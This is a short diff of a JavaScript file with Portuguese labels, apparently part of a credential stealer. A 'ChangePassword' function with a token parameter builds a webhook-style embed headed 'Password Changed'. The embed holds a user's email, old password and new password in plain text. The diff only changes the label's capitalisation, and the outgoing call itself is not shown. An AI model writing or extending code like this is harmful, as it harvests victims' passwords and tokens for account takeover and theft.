@@ -191,7 +191,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "fields": [
                         {
                             "name": "**Senha Alterada**",
-                            "value": `Email: ${json.email}\nSENHA ANTIGA: ${oldpassword}\nNova Senha: ${newpassword}`,
+                            "value": `Email: ${json.email}\nSenha Antiga: ${oldpassword}\nNova Senha: ${newpassword}`,
                             "inline": true
                         },
                         {
